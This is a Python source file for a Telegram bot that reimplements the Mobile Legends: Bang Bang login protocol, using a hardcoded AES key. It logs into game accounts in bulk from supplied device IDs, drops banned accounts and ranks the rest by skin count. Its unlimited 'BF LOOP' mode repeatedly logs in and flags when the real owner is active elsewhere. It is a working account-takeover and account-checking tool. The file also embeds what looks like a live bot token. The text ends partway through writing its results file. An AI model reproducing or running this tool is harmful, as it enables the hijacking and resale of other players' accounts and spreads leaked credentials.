#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MLBB BOT — 2 FITUR (NO ANIMATION, BACKGROUND)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. ⚡ FAST BULK  — sort skin, skip banned, output TXT+JSON
2. 🔁 BF LOOP    — UNLIMITED, background, kirim full di akhir
"""

import os, sys, time, socket, struct, zlib, random, uuid, logging
import datetime, threading, asyncio, re, json
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed

import urllib3
import zstandard as zstd
from Crypto.Cipher import AES

import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)
from telegram.error import Conflict, InvalidToken

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ══════════════════════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════════════════════
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8867228317:AAFBS1ke3wGF8BHOuvE9D3nJysdTAjn-SMA")
OWNER_ID  = int(os.getenv("TELEGRAM_OWNER_ID", "7601958159"))

REQUIRED_CHANNEL      = "@DEVICEIDMLBBGLOBAL"
REQUIRED_CHANNEL_LINK = "https://t.me/DEVICEIDMLBBGLOBAL"

AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV  = b'\x00' * 16

OUTPUT_DIR = os.path.join(os.path.expanduser("~"), "storage", "downloads", "mlbb_results")
os.makedirs(OUTPUT_DIR, exist_ok=True)
USERS_DB_FILE = os.path.join(OUTPUT_DIR, "bot_users.json")

MAX_BF_DEVICES   = 999_999
MAX_BULK_DEVICES = 999_999
BULK_THREADS     = 16
BF_THREADS       = 20

BANNED_KEYWORDS = [
    "banned", "ban", "suspend", "suspended", "blocked",
    "account banned", "akun diblokir", "diblokir", "dibanned",
    "permanen", "permanent ban", "permanent banned",
    "cheat", "hack", "penalti", "penalty", "pelanggaran",
    "restricted", "restriction", "violation", "violate",
    "account_lock", "accountlock", "lock_account",
    "perma", "permanent", "banned_account",
    "disabled", "deactivated", "terminated",
    "forbidden", "not_allowed", "no_access",
    "unusual", "abnormal", "suspicious",
    "tidak_aktif", "nonaktif", "dibekukan",
]

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)
BOT_START_TIME = time.time()


# ══════════════════════════════════════════════════════════════════════
# USER DB
# ══════════════════════════════════════════════════════════════════════
_user_lock = threading.Lock()

def load_users() -> set:
    try:
        with _user_lock:
            if os.path.exists(USERS_DB_FILE):
                with open(USERS_DB_FILE, "r", encoding="utf-8") as f:
                    return set(int(x) for x in json.load(f))
    except Exception:
        pass
    return set()

def save_users(users: set):
    try:
        with _user_lock:
            with open(USERS_DB_FILE, "w", encoding="utf-8") as f:
                json.dump(list(users), f)
    except Exception:
        pass

def register_user(uid: int):
    u = load_users()
    if uid not in u:
        u.add(uid)
        save_users(u)


# ══════════════════════════════════════════════════════════════════════
# SDP PROTOCOL
# ══════════════════════════════════════════════════════════════════════
class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT            = 2
    DOUBLE           = 3
    STRING           = 4
    LIST             = 5
    DICT             = 6
    STRUCT_BEGIN     = 7
    STRUCT_END       = 8

class SdpException(Exception):
    pass

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self.offset = 0
            self._unpack_from_binary()
        elif data is not None:
            super().update(data)
            self._pack_to_binary()

    def _pack_to_binary(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for tag, value in sorted(self.items()):
            self._pack(tag, value)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack_from_binary(self):
        if not self.data:
            return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            tag, value = self._unpack()
            if isinstance(value, SdpDataType) and value == SdpDataType.STRUCT_END:
                break
            self[tag] = value

    def _write_number(self, value):
        r = bytearray()
        while value >= 0x80:
            r.append((value & 0x7F) | 0x80)
            value >>= 7
        r.append(value & 0x7F)
        return bytes(r)

    def _read_number(self):
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag, data_type):
        if tag < 15:
            self.data += bytes([(data_type.value << 4) | tag])
        else:
            self.data += bytes([(data_type.value << 4) | 15])
            self.data += self._write_number(tag)

    def _pack(self, tag, value):
        if isinstance(value, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_number(-value)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_number(value)
        elif isinstance(value, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            p = struct.pack("<d", value)
            self.data += self._write_number(len(p))
            self.data += p
        elif isinstance(value, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            enc = value.encode('utf-8') if isinstance(value, str) else value
            self.data += self._write_number(len(enc))
            self.data += enc
        elif isinstance(value, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_number(len(value))
            for i in value:
                self._pack(0, i)
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(value.items()):
                    self._pack(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_number(len(value))
                for k, v in sorted(value.items()):
                    self._pack(0, k)
                    self._pack(0, v)
        else:
            raise SdpException(f"Unsupported type: {type(value)}")

    def _unpack(self):
        try:
            if self.offset >= len(self.data):
                return 0, None
            h = self.data[self.offset]
            tag = h & 0xF
            dt = SdpDataType(h >> 4)
            self.offset += 1
            if tag == 15:
                tag = self._read_number()
            if dt == SdpDataType.INTEGER_POSITIVE:
                return tag, self._read_number()
            elif dt == SdpDataType.INTEGER_NEGATIVE:
                return tag, -self._read_number()
            elif dt == SdpDataType.FLOAT:
                v = self._read_number().to_bytes(4, 'little')
                return tag, struct.unpack("<f", v)[0]
            elif dt == SdpDataType.DOUBLE:
                v = self._read_number().to_bytes(8, 'little')
                return tag, struct.unpack("<d", v)[0]
            elif dt == SdpDataType.STRING:
                length = self._read_number()
                try:
                    v = self.data[self.offset:self.offset + length].decode('utf-8')
                except UnicodeDecodeError:
                    v = self.data[self.offset:self.offset + length]
                self.offset += length
                return tag, v
            elif dt == SdpDataType.LIST:
                length = self._read_number()
                v = []
                for _ in range(length):
                    _, it = self._unpack()
                    v.append(it)
                return tag, v
            elif dt == SdpDataType.DICT:
                length = self._read_number()
                v = {}
                for _ in range(length):
                    _, k = self._unpack()
                    _, val = self._unpack()
                    v[k] = val
                return tag, v
            elif dt == SdpDataType.STRUCT_BEGIN:
                sd = {}
                while True:
                    st, sv = self._unpack()
                    if isinstance(sv, SdpDataType) and sv == SdpDataType.STRUCT_END:
                        break
                    sd[st] = sv
                return tag, SdpStruct(sd)
            elif dt == SdpDataType.STRUCT_END:
                return tag, SdpDataType.STRUCT_END
            else:
                raise SdpException("Unknown")
        except Exception as e:
            raise SdpException(f"unpack err: {e}")

    def copy(self):
        return SdpStruct(super().copy())

    def update(self, other):
        super().update(other)
        self._pack_to_binary()


# ══════════════════════════════════════════════════════════════════════
# BASE CONNECTION
# ══════════════════════════════════════════════════════════════════════
class BaseConnection:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue_data = b''
        self.last_header_size = 0

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *a):
        self.cleanup()

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(2)

    def cleanup(self):
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
            self.sequence = 1
            self.socket = None

    def send_data(self, id, sdp):
        packet = SdpStruct({0: id, 1: self.sequence, 5: sdp.data}).data
        buf = zstd.compress(packet)
        flags = (len(buf) + 4) | (16 << 24)
        buf = flags.to_bytes(4, 'big') + buf
        self.socket.send(buf)
        self.sequence += 1

    def recv_data(self):
        try:
            while len(self.queue_data) < 4:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data
            flags = int.from_bytes(self.queue_data[:4], 'big')
            size = flags & 0xFFFFFF
            ct = flags >> 24
            self.last_header_size = size
            while len(self.queue_data) < size:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data
            data = self.queue_data[4:size]
            self.queue_data = self.queue_data[size:]
            if ct == 1:
                data = zlib.decompress(data)
            elif ct == 16:
                data = zstd.decompress(data)
            elif ct in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                dec = cipher.decrypt(data[:-1] if len(data) % 16 != 0 else data)
                data = dec.rstrip(b'\x00')
                if ct == 3:
                    data = zlib.decompress(data)
                elif ct == 18:
                    data = zstd.decompress(data)
            result = SdpStruct(data)
            pid = result[0]
            if pid is None:
                return None, None
            res = result.get(6)
            if not res or not isinstance(res, bytes):
                res = result.get(5)
                if not res or not isinstance(res, bytes):
                    return pid, None
            return pid, SdpStruct(res)
        except socket.timeout:
            return -1, None
        except Exception:
            return None, None


# ══════════════════════════════════════════════════════════════════════
# GAME CONNECTION
# ══════════════════════════════════════════════════════════════════════
class GameConnection(BaseConnection):
    def __init__(self, device_id, device_model=None):
        super().__init__('login.ml.youngjoygame.com', 30021)
        self.device_id = device_id
        self.device_model = device_model or "Xiaomi:Redmi Note 12"

        parts = self.device_id.split('_')
        if len(parts) >= 2:
            di = parts[1]
            if len(parts) >= 3 and len(di) < 32:
                di = di + "_" + parts[2]
            if len(di) >= 32:
                self.imei_md5 = di[:32]
                if len(di) >= 48:
                    self.android_id = di[32:48]
                    self.advertising_id = di[48:] if len(di) > 48 else ""
                else:
                    self.android_id = ""
                    self.advertising_id = ""
            else:
                self.imei_md5 = di
                self.android_id = ""
                self.advertising_id = ""
        else:
            self.imei_md5 = device_id
            self.android_id = ""
            self.advertising_id = ""

        self.channel = 'and_usa'
        self.client_version = '2.2.16.1232.1'
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_server_host = ''
        self.game_server_port = 0
        self.creation_ts = 0
        self.kick_detected = False

    def _login_packet(self):
        return SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: self.client_version,
            3: self.channel,
            4: 'en'
        })

    def login_to_login_server(self):
        if self.host != 'login.ml.youngjoygame.com' or self.port != 30021:
            self.cleanup()
            self.host = 'login.ml.youngjoygame.com'
            self.port = 30021
            self.connect()
        self.send_data(1, self._login_packet())
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res[1]
            zr = res.get(2)
            if isinstance(zr, list) and zr:
                self.zone_id = zr[0] if not isinstance(zr[0], dict) else zr[0].get(0, 0)
            elif isinstance(zr, dict):
                self.zone_id = zr.get(0, 0)
            else:
                self.zone_id = zr
            self.creation_ts = res.get(19, 0)
            return True
        return False

    def get_game_server(self):
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key,
            2: self.client_version, 5: self.zone_id, 6: self.channel
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            gs = res[1]
            self.game_server_host, self.game_server_port = gs.split(':')
            self.game_server_port = int(self.game_server_port)
            return True
        return False

    def connect_to_game_server(self):
        self.cleanup()
        self.host = self.game_server_host
        self.port = self.game_server_port
        self.connect()

        self.send_data(10001, SdpStruct({
            0: self.account_id,
            1: self.session_key,
            2: self.zone_id,
            4: self.client_version,
            13: self.channel,
            15: self.device_id
        }))
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))

        while True:
            pid, res = self.recv_data()
            if pid is None:
                return False
            elif pid == 10002:
                return True
            elif pid == -1:
                return False
            elif pid == 20001:
                try:
                    if self._is_kick_notification(res):
                        self.kick_detected = True
                except Exception:
                    pass
                return True

    def _is_kick_notification(self, res):
        if not res:
            return False
        keywords = [
            'login di perangkat lain', 'perangkat lain',
            'logged in on another device', 'another device',
            'other device', 'kick', 'kicked',
            'login elsewhere', 'device lain',
        ]

        def check_value(v):
            if isinstance(v, str):
                lv = v.lower()
                return any(kw in lv for kw in keywords)
            elif isinstance(v, bytes):
                try:
                    lv = v.decode('utf-8', errors='ignore').lower()
                    return any(kw in lv for kw in keywords)
                except Exception:
                    pass
            return False

        def walk(d):
            if isinstance(d, dict):
                for k, v in d.items():
                    if check_value(v):
                        return True
                    if isinstance(v, (dict, list)) and walk(v):
                        return True
            elif isinstance(d, list):
                for item in d:
                    if check_value(item):
                        return True
                    if isinstance(item, (dict, list)) and walk(item):
                        return True
            return False

        try:
            return walk(res)
        except Exception:
            return False

    def lookup_player(self, search_value, search_type="id", server_filter=None):
        if search_type == "id":
            try:
                ld = SdpStruct({1: int(search_value)})
            except ValueError:
                ld = SdpStruct({1: search_value})
        else:
            ld = SdpStruct({0: str(search_value).strip()})
        self.send_data(11153, ld)
        cnt = 0
        while True:
            pid, res = self.recv_data()
            if pid is None:
                return None
            elif pid == -1:
                return None
            elif pid == 11154:
                if search_type == "nickname" and server_filter is not None:
                    for p in (res.get(0) or []):
                        if isinstance(p, dict) and p.get(1) == server_filter:
                            return {0: [p]}
                    return None
                return res
            elif pid == 20001:
                cnt += 1
                if self.last_header_size < 100 and cnt >= 2:
                    return None

    def get_skin_role_info(self, role_id, zone_id, max_retries=3):
        for _ in range(max_retries):
            try:
                self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
                to = 0
                while to < 3:
                    pid, res = self.recv_data()
                    if pid is None:
                        break
                    elif pid == -1:
                        to += 1
                    elif pid == 10144:
                        return res
                    elif pid == 20001:
                        continue
            except Exception:
                pass
        return None

    def __enter__(self):
        super().__enter__()
        if not self.login_to_login_server():
            raise ConnectionError("LOGIN_FAILED")
        if not self.get_game_server():
            raise ConnectionError("SERVER_SELECTION_FAILED")
        return self


# ══════════════════════════════════════════════════════════════════════
# RANK MAPPER
# ══════════════════════════════════════════════════════════════════════
def map_rank(p):
    R = [
        (0,4,"Warrior III"),(5,9,"Warrior II"),(10,14,"Warrior I"),
        (15,19,"Elite IV"),(20,24,"Elite III"),(25,29,"Elite II"),(30,34,"Elite I"),
        (35,39,"Master IV"),(40,44,"Master III"),(45,49,"Master II"),(50,54,"Master I"),
        (55,59,"Grandmaster IV"),(60,64,"Grandmaster III"),(65,69,"Grandmaster II"),(70,74,"Grandmaster I"),
        (75,81,"Epic IV"),(82,88,"Epic III"),(89,95,"Epic II"),(96,107,"Epic I"),
        (108,114,"Legend IV"),(115,121,"Legend III"),(122,128,"Legend II"),(129,135,"Legend I"),
    ]
    for mn, mx, r in R:
        if mn <= p <= mx: return r
    if 136 <= p <= 160: return f"Mythic {p-135}"
    if 161 <= p <= 195: return f"Mythical Honor {p-135}"
    if 196 <= p <= 235: return f"Mythical Glory {p-157}"
    if p >= 236: return f"Mythical Immortal {p-157}"
    return "Unknown"


# ══════════════════════════════════════════════════════════════════════
# EXTRACT PLAYER DATA
# ══════════════════════════════════════════════════════════════════════
def extract_player_data(result, role_info=None, creation_ts=0):
    if not result or not result.get(0) or len(result[0]) == 0:
        return None
    try:
        pd = result[0][0]
        nickname = pd.get(2, "Unknown")
        player_id = pd.get(0, "Unknown")
        server = pd.get(1, "Unknown")
        level = pd.get(3, "Unknown")
        skin_count = pd.get(83, 0)
        hero_count = pd.get(4, 0)
        matches = pd.get(17, 0)
        if role_info:
            hero_count = role_info.get(9, hero_count)
            matches = role_info.get(22, matches)
        tag_95 = pd.get(95)
        tag_8 = pd.get(8)
        high_rank = map_rank(tag_95) if tag_95 is not None else "Unknown"
        current_rank = map_rank(tag_8) if tag_8 is not None else "Unknown"

        return {
            "nickname": nickname, "player_id": player_id, "server": server,
            "level": level, "skin_count": skin_count, "hero_count": hero_count,
            "matches": matches, "current_rank": current_rank, "high_rank": high_rank,
        }
    except Exception as e:
        logger.exception(f"extract err: {e}")
        return None


# ══════════════════════════════════════════════════════════════════════
# BANNED DETECTION
# ══════════════════════════════════════════════════════════════════════
def is_banned_response(result, pdata=None) -> bool:
    if not result:
        return False
    try:
        raw = str(result).lower()
        for kw in BANNED_KEYWORDS:
            if kw in raw:
                return True
    except Exception:
        pass
    try:
        if result.get(0) and len(result[0]) > 0:
            pd = result[0][0]
            nick = str(pd.get(2, "")).lower()
            for kw in BANNED_KEYWORDS:
                if kw in nick:
                    return True
            lvl = pd.get(3)
            if lvl is None or (isinstance(lvl, int) and lvl <= 0):
                return True
    except Exception:
        pass
    if pdata:
        sc = pdata.get("skin_count", 0)
        hc = pdata.get("hero_count", 0)
        lv = pdata.get("level", 0)
        if (sc == 0 and hc == 0) or (isinstance(lv, int) and lv <= 0):
            return True
    return False


# ══════════════════════════════════════════════════════════════════════
# SCAN & BF
# ══════════════════════════════════════════════════════════════════════
def scan_account_detail(device_id: str) -> dict:
    out = {
        "device_id": device_id, "player_id": None, "nickname": None,
        "level": 0, "skin_count": 0, "hero_count": 0, "matches": 0,
        "rank": "-", "high_rank": "-",
        "status": "fail", "error": None, "banned": False,
    }
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.connect_to_game_server():
                out["error"] = "GAME_CONNECT_FAILED"
                return out
            acc_id  = conn.account_id
            zone_id = conn.zone_id
            result = conn.lookup_player(acc_id, "id")
            if not result:
                out["error"] = "LOOKUP_FAILED"
                return out

            role_info = None
            try:
                role_info = conn.get_skin_role_info(acc_id, zone_id)
            except Exception:
                pass

            pdata = extract_player_data(result, role_info=role_info,
                                        creation_ts=conn.creation_ts)

            if is_banned_response(result, pdata):
                out["banned"] = True
                out["status"] = "banned"
                out["error"]  = "BANNED"
                return out

            if not pdata:
                out["error"] = "EXTRACT_FAILED"
                return out

            out["player_id"]  = pdata.get("player_id")
            out["nickname"]   = pdata.get("nickname")
            out["level"]      = pdata.get("level", 0)
            out["skin_count"] = pdata.get("skin_count", 0)
            out["hero_count"] = pdata.get("hero_count", 0)
            out["matches"]    = pdata.get("matches", 0)
            out["rank"]       = pdata.get("current_rank", "-")
            out["high_rank"]  = pdata.get("high_rank", "-")
            out["status"]     = "success"
    except ConnectionError as e:
        out["error"] = f"CONN_ERROR: {e}"
    except socket.timeout:
        out["error"] = "SOCKET_TIMEOUT"
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {e}"
    return out


def bf_login_with_device(device_id, device_model=None):
    result = {
        "status": "fail", "device_id": device_id,
        "info": None, "error": None, "kick": False,
    }
    try:
        with GameConnection(device_id=device_id, device_model=device_model) as conn:
            if not conn.connect_to_game_server():
                result["error"] = "GAME_CONNECT_FAILED"
                return result
            result["status"] = "success"
            result["info"] = {
                "account_id": conn.account_id,
                "zone_id": conn.zone_id,
            }
            result["kick"] = getattr(conn, "kick_detected", False)
    except ConnectionError as e:
        result["error"] = f"CONN_ERROR: {e}"
    except socket.timeout:
        result["error"] = "SOCKET_TIMEOUT"
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"
    return result


# ══════════════════════════════════════════════════════════════════════
# UTIL
# ══════════════════════════════════════════════════════════════════════
DEVICE_ID_RE = re.compile(r"(?i)(?:and_|ios_)[A-Za-z0-9_-]+")


def extract_device_ids_from_text(text: str):
    found = DEVICE_ID_RE.findall(text or "")
    seen, out = set(), []
    for d in found:
        k = d.lower()
        if k in seen: continue
        seen.add(k); out.append(d)
    return out


def format_uptime(seconds):
    d = int(seconds // 86400)
    h = int((seconds % 86400) // 3600)
    m = int((seconds % 3600) // 60)
    s = int(seconds % 60)
    parts = []
    if d: parts.append(f"{d}h")
    if h: parts.append(f"{h}j")
    if m: parts.append(f"{m}m")
    parts.append(f"{s}s")
    return " ".join(parts)


# ══════════════════════════════════════════════════════════════════════
# STATE
# ══════════════════════════════════════════════════════════════════════
bf_stop_flags   = {}
bulk_stop_flags = {}
bf_tasks        = {}
bf_pause        = {}

(MENU, IN_BF, BF_RUN, IN_BULK, BULK_RUN) = range(5)


# ══════════════════════════════════════════════════════════════════════
# KEYBOARD
# ══════════════════════════════════════════════════════════════════════
def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ FAST BULK", callback_data="d_bulk"),
         InlineKeyboardButton("🔁 BF LOOP",   callback_data="d_bf")],
        [InlineKeyboardButton("❌ Tutup",     callback_data="m_close")],
    ])

def kb_stop_bulk():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 STOP BULK", callback_data="stop_bulk")]
    ])

def kb_bf_running(paused=False):
    if paused:
        row1 = [InlineKeyboardButton("▶️ LANJUT", callback_data="bf_resume")]
    else:
        row1 = [InlineKeyboardButton("⏸️ PAUSE", callback_data="bf_pause")]
    row2 = [InlineKeyboardButton("🛑 STOP", callback_data="stop_bf"),
            InlineKeyboardButton("🗑️ HAPUS", callback_data="bf_delete")]
    return InlineKeyboardMarkup([row1, row2])

def kb_join():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 JOIN CHANNEL", url=REQUIRED_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ SUDAH JOIN", callback_data="check_join")],
    ])


# ══════════════════════════════════════════════════════════════════════
# JOIN CHECK
# ══════════════════════════════════════════════════════════════════════
async def is_joined(uid, context):
    try:
        m = await context.bot.get_chat_member(REQUIRED_CHANNEL, uid)
        return m.status in ("member", "administrator", "creator")
    except Exception:
        return False


async def require_join(update, context):
    uid = update.effective_user.id
    if await is_joined(uid, context):
        return True
    txt = f"🔒 *Akses Dibatasi*\n\nWajib join: {REQUIRED_CHANNEL_LINK}"
    if update.callback_query:
        await update.callback_query.message.reply_text(
            txt, parse_mode="Markdown", reply_markup=kb_join())
    else:
        await update.message.reply_text(
            txt, parse_mode="Markdown", reply_markup=kb_join())
    return False


# ══════════════════════════════════════════════════════════════════════
# COMMANDS
# ══════════════════════════════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    register_user(update.effective_user.id)
    if not await require_join(update, context):
        return ConversationHandler.END
    await update.message.reply_text(
        "🤖 *MLBB BOT*\n\nPilih menu:",
        parse_mode="Markdown", reply_markup=kb_main())
    return MENU


async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("❌ Dibatalkan.", reply_markup=kb_main())
    return MENU


async def cmd_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    await update.message.reply_text(f"🆔 `{u.id}`", parse_mode="Markdown")


# ══════════════════════════════════════════════════════════════════════
# MENU ROUTER
# ══════════════════════════════════════════════════════════════════════
async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data
    register_user(uid)

    if data == "check_join":
        if await is_joined(uid, context):
            await q.message.edit_text("✅ OK! Kirim /start")
        else:
            await q.message.edit_text("❌ Belum join.", reply_markup=kb_join())
        return ConversationHandler.END

    if not await is_joined(uid, context):
        await q.message.edit_text(
            f"🔒 *Akses Dibatasi*\n\nWajib join: {REQUIRED_CHANNEL_LINK}",
            parse_mode="Markdown", reply_markup=kb_join())
        return MENU

    if data == "m_close":
        await q.message.edit_text("👋 Bye!")
        return ConversationHandler.END

    if data == "m_home":
        await q.message.edit_text(
            "🤖 *MLBB BOT*\n\nPilih menu:",
            parse_mode="Markdown", reply_markup=kb_main())
        return MENU

    if data == "d_bulk":
        context.user_data["await"] = "bulk"
        await q.message.edit_text(
            "⚡ *FAST BULK*\n\n"
            "Kirim / upload file `.txt` berisi Device ID.\n\n"
            "• Sort: *skin terbanyak* di atas\n"
            "• 🚫 Akun *banned* otomatis di-buang\n"
            "• Output: `.txt` + `.json`",
            parse_mode="Markdown")
        return IN_BULK

    if data == "d_bf":
        context.user_data["await"] = "bf"
        await q.message.edit_text(
            "🔁 *BF LOOP — UNLIMITED*\n\n"
            "Kirim Device ID (bisa banyak, tidak ada batas).\n\n"
            "• ♾️ Loop tanpa batas\n"
            "• ⏸️ Bisa Pause & Lanjut\n"
            "• 🗑️ Bisa Hapus progress\n"
            "• ⚠️ Notif kalau akun aktif di perangkat lain",
            parse_mode="Markdown")
        return IN_BF

    if data == "stop_bulk":
        ev = bulk_stop_flags.get(uid)
        if ev: ev.set()
        await q.message.edit_text("🛑 Stop BULK...", reply_markup=kb_main())
        return MENU

    if data == "stop_bf":
        ev = bf_stop_flags.get(uid)
        if ev: ev.set()
        await q.message.edit_text("🛑 Stop BF...", reply_markup=kb_main())
        return MENU

    return MENU


# ══════════════════════════════════════════════════════════════════════
# INPUT HANDLER
# ══════════════════════════════════════════════════════════════════════
async def input_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await_ = context.user_data.get("await")

    if await_ == "bf":
        context.user_data.pop("await", None)
        return await bf_input(update, context)

    if await_ == "bulk":
        context.user_data.pop("await", None)
        return await bulk_input(update, context)

    await update.message.reply_text("❓ Pilih menu dulu.", reply_markup=kb_main())
    return MENU


# ══════════════════════════════════════════════════════════════════════
# ⚡ FAST BULK — BACKGROUND, NO ANIMATION
# ══════════════════════════════════════════════════════════════════════
async def bulk_input(update, context):
    uid = update.effective_user.id
    devs = extract_device_ids_from_text(update.message.text or "")

    if update.message.document:
        try:
            f = await update.message.document.get_file()
            b = await f.download_as_bytearray()
            devs += extract_device_ids_from_text(b.decode("utf-8", errors="ignore"))
        except Exception as e:
            await update.message.reply_text(f"❌ Gagal baca file: {e}")
            return MENU

    devs = list(dict.fromkeys(devs))[:MAX_BULK_DEVICES]
    if not devs:
        await update.message.reply_text("❌ Tidak ada Device ID valid.",
                                        reply_markup=kb_main())
        return MENU

    ev = threading.Event()
    bulk_stop_flags[uid] = ev

    await update.message.reply_text(
        f"⚡ *FAST BULK*\n\n"
        f"📱 Total device : `{len(devs)}`\n"
        f"🔄 Status       : *Berjalan di background...*\n\n"
        f"Hasil akan dikirim otomatis setelah selesai.",
        parse_mode="Markdown",
        reply_markup=kb_stop_bulk())

    # Jalan di background, langsung kirim hasil full saat selesai
    asyncio.create_task(_run_bulk(uid, update.effective_chat.id, devs, ev, context))
    return BULK_RUN


async def _run_bulk(uid, chat_id, devs, ev, context):
    total  = len(devs)
    done   = 0
    succ   = []
    banned = 0
    fail   = 0

    with ThreadPoolExecutor(max_workers=BULK_THREADS) as pool:
        futs = {pool.submit(scan_account_detail, d): d for d in devs}
        for fut in as_completed(futs):
            if ev.is_set():
                break
            try:
                r = fut.result()
            except Exception:
                done += 1
                fail += 1
                continue

            done += 1

            if r.get("banned") or r.get("status") == "banned":
                banned += 1
            elif r.get("status") == "success":
                if r.get("skin_count", 0) == 0 and r.get("hero_count", 0) == 0:
                    banned += 1
                elif r.get("level", 0) <= 0:
                    banned += 1
                else:
                    succ.append(r)
            else:
                fail += 1

    bulk_stop_flags.pop(uid, None)
    succ.sort(key=lambda x: x.get("skin_count", 0), reverse=True)

    ts = int(time.time())
    fname_txt  = f"BULK_{ts}.txt"
    fname_json = f"BULK_{ts}.json"
    fpath_txt  = os.path.join(OUTPUT_DIR, fname_txt)
    fpath_json = os.path.join(OUTPUT_DIR, fname_json)

    # ── TXT ──
    with open(fpath_txt, "w", encoding="utf-8") as f:
        f.write("╔" + "═" * 96 + "╗\n")
        f.write("║" + "FAST BULK RESULT — MLBB".center(96) + "║\n")
        f.write("╚" + "═" * 96 + "╝\n\n")
        f.write(f"Generated : {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n")
        f.write(f"Total     : {total}\n")
        f.write(f"Hit       : {len(succ)}\n")
        f.write(f"Banned    : {banned} (dibuang)\n")
        f.write(f"Fail      : {fail}\n")
        f.write(f"Sort      : skin_count DESC\n\n")

        f.write("┌────┬──────────────────────┬────────┬───────┬───────┬──────────────┬────────────┬────────────┬──────────────────────┐\n")
        f.write("│ No │ Device ID            │ Skin   │ Hero  │ Level │ Rank         │ ID Akun    │ Zone       │ Nickname             │\n")
        f.write("├────┼──────────────────────┼────────┼───────┼───────┼──────────────┼────────────┼────────────┼──────────────────────┤\n")

        for i, r in enumerate(succ, 1):
            dev  = str(r.get("device_id", "-"))
            dev  = dev[:20] + ".." if len(dev) > 22 else dev
            skin = str(r.get("skin_count", 0))
            hero = str(r.get("hero_count", 0))
            lvl  = str(r.get("level", 0))
            rank = str(r.get("rank", "-"))[:12]
            pid  = str(r.get("player_id", "-"))
            zone = str(r.get("server", "-"))
            nick = str(r.get("nickname", "-"))
            nick = nick[:20] + ".." if len(nick) > 22 else nick

            f.write(f"│ {i:>2} │ {dev:<20} │ {skin:>6} │ {hero:>5} │ {lvl:>5} │ {rank:<12} │ {pid:<10} │ {zone:<10} │ {nick:<20} │\n")

        f.write("└────┴──────────────────────┴────────┴───────┴───────┴──────────────┴────────────┴────────────┴──────────────────────┘\n\n\n")

        f.write("╔" + "═" * 96 + "╗\n")
        f.write("║" + "DETAIL PER AKUN".center(96) + "║\n")
        f.write("╚" + "═" * 96 + "╝\n\n")

        for i, r in enumerate(succ, 1):
            f.write(f"┌─ [{i}] {r.get('nickname','-')} ─────────────────────────────────────────\n")
